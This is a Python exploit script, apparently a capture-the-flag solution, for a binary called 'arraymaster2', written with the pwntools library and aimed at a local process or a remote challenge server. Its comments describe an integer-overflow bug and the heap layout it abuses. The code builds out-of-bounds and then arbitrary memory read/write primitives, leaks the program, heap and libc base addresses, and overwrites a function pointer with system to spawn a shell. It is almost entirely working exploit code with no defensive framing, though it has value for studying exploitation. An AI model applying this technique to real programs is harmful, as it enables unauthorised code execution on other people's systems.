#!/usr/bin/env python2
from pwn import *
from huepy import *
import sys

# The bug is an integer overflow in the allocation of an int64 array. I use this to get an OOB read/write.
# But since that only works if I can get the offset from my array to whatever I want to read/write instead of
# working by specifying an address that I want to read from/write to, I'm allocating two more arrays.
# Using the OOB write I can modify the data pointer of these arrays and my moving the data pointer to a location
# where I want to read from/write to, I can simply use the get or set functions to read/write anything.
# Once I have an arbitrary read/write primitive, getting a shell is trivial (see stage 5&6).
# with each array allocation two chunks get allocated on the heap. The first one contains the metadata
# of the array (e.g. pointers, size...) and the second one contains the actual values stored in the array.
# This is the layout of my arrays on the heap:
#
#             chunk1 of array 1
# HEAP METADATA         <- Data used by the heap algorithm
# 2305843009213693953   <- this is the size field of my first array
# 0x40                  <- this is the type field 0x40 = 64 bc it's an int64 array
# index0 pointer        <- this points to the first index of of this array
# int64_get pointer     <- this gets called whenever you call get on the array
# int64_set pointer     <- this gets called whenever you call set on the array
#             chunk2 of array 1
# HEAP METADATA         <- Data used by the heap algorithm
# 0x0000000000000000
# 0x0000000000000000
# ...
#             chunk1 of array 2
# HEAP METADATA         <- Data used by the heap algorithm
# 1                     <- this is the size field of my first array
# 0x40                  <- this is the type field 0x40 = 64 bc it's an int64 array
# index0 pointer        <- this points to the first index of this array
# int64_get pointer     <- this gets called whenever you call get on the array
# int64_set pointer     <- this gets called whenever you call set on the array
#             chunk2 of array 2
# HEAP METADATA         <- Data used by the heap algorithm
# 0x4141414141414141
#             chunk1 of array 3
# HEAP METADATA         <- Data used by the heap algorithm
# 1                     <- this is the size field of my first array
# 0x40                  <- this is the type field 0x40 = 64 bc it's an int64 array
# index0 pointer        <- this points to the first index of this array
# int64_get pointer     <- this gets called whenever you call get on the array
# int64_set pointer     <- this gets called whenever you call set on the array
#             chunk2 of array 3
# HEAP METADATA         <- Data used by the heap algorithm
# 0x4242424242424242 
# 

bin = "./arraymaster2"
lib = "libc.so.6"
int64_get = 0xa88           # offset to the int64_get function in the binary

read_arr_offset = 0x1120    # based on my debugging I found, that if you allocate two int64 arrays
                            # the first element of the second one will be 0x1120 bytes after the heap base
                            # NOTE: this might differ on the remote system

context(terminal=['tmux', 'new-window'], os='linux', arch='amd64')
if 'debug' in sys.argv:
    context.log_level='debug'
if 'pause' not in sys.argv:
    def pause():
        pass
if 'remote' in sys.argv:
    p = remote("35.207.132.47", 22229)
    # place remote offsets here
    lib = "libc-2.27.so"
else:
    p = process(bin)
    # place local offsets here
log.info("Mapping binary")
elf = ELF(bin)
libc = ELF(lib)

############################## GET/SET wrapper ##############################
def get(ID, index):
    p.read()
    p.sendline("get %s %s" % (ID, index))
    value = int(p.readline())
    return value

def set(ID, index, value):
    p.readuntil("> ")
    p.sendline("set %s %d %d" % (ID, index, value))

############################## Read64/Write64 primitive ##############################
def read64(addr):
    set("A", read_arr_base+2, addr)
    p.read()
    data = get("B", 0)
    return data

def write64(addr, data):
    set("A", write_arr_base+2, addr)
    set("C", 0, data)

############################## Exploit stage 1: setup arrays ########################################
log.info("Setting up array 1")
p.readuntil("> ")
p.sendline("init A 64 2305843009213693953")     # Trigger integer overflow to achieve OOB read and write
p.read()
log.success("Done!")

log.info("Setting up array 2")
p.sendline("init B 64 1")                       # This array is the one we're going to use for reading
set("B", 0, 0x4141414141414141)
p.read()
log.success("Done!")

log.info("Setting up array 3")
p.sendline("init C 64 1")                       # This array is the one we're going to use for writing
set("C", 0, 0x4242424242424242)
p.read()
log.success("Done!")

pause()

############################## Exploit stage 2: build read/write primitive ########################################
log.info("Building read primitive...")
log.success("Walking memory for array 2")
i = 0
while(get("A", i) != 0x4141414141414141):       # Use the OOB read to find array 2
    i += 1
global read_arr_base
log.success("Found array 2 at index " + str(i))
read_arr_base = i-6                             # the returned index will point to the first element of the array
                                                # We want to get the index to the first element of the
                                                # previous allocated chunk since thats the one containing all the
                                                # interesting pointers

log.info("Building write primitive...")
log.success("Walking memory for array 3")
i=0
while(get("A", i) != 0x4242424242424242):       # Use the OOB read to find array 3
    i += 1
global write_arr_base
log.success("Found array 3 at index " + str(i))
write_arr_base = i-6

############################## Exploit stage 3: leak __text base ########################################
log.info("Leaking int64_get...")
int64_get_leak = get("A", read_arr_base+3)                  # read_arr_base+3 contains the pointer to int64_get
log.success("Leaked int64_get: " + white(hex(int64_get_leak)))
log.success("Calculating PIE offset...")
elf.address = int64_get_leak - int64_get
log.success("PIE offset: " + white(hex(elf.address)))

log.info("Leaking array 2 pointer...")
read_arr_addr = get("A", read_arr_base+2)                   # read_arr_base+2 contains the pointer to the first array index
log.success("Array 2 pointer: " + white(hex(read_arr_addr)))
log.success("Calculating heap base...")
heap_base = read_arr_addr - read_arr_offset
log.success("Heap base: " + white(hex(heap_base)))

############################## Exploit stage 4: test Read/Write ########################################
log.success("Testing read64()...")
read_test = read64(elf.address)                     # This should return the ELF header
log.info(hexdump(read_test))
if read_test != 0x10102464c457f:
    log.critical("read64() doesn't work...")
    exit(-1)

log.success("Testing write64()...")
write64(heap_base + 0x110, 0x576f726b696e673f)        # heap_base+0x110 is just empty space
pause()
write_test = read64(heap_base + 0x110)                # This should return: "Working?"
log.info(hexdump(write_test))
if write_test != 0x576f726b696e673f:
    log.critical("write64() doesn't work...")
    exit(-1)

log.success(green("Got stable read/write!!!"))

############################## Exploit stage 5: Leak ASLR slide ########################################
log.info("Leaking Calculatinf ASLR slide...")
puts_leak = read64(elf.symbols[u'got.puts'])
libc.address = puts_leak - libc.symbols['puts']
log.success("puts@glibc:" + white(hex(puts_leak)))
log.success("libc base: " + white(hex(libc.address)))

############################## Exploit stage 6: call system /bin/sh ########################################
p.sendline("Overwriting length field with //bin/sh\\x00")
set("A", read_arr_base, 0x0068732f6e69622f)     # /bin/sh\x00
p.read()
p.sendline("Overwriting int64_get pointer with system")
set("A", read_arr_base+3, libc.symbols['system'])
p.read()
p.sendline("get B 0")                   # Trigger the call to the corrupted int64_get pointer
p.read()
log.success("Spawning shell...")

p.interactive()
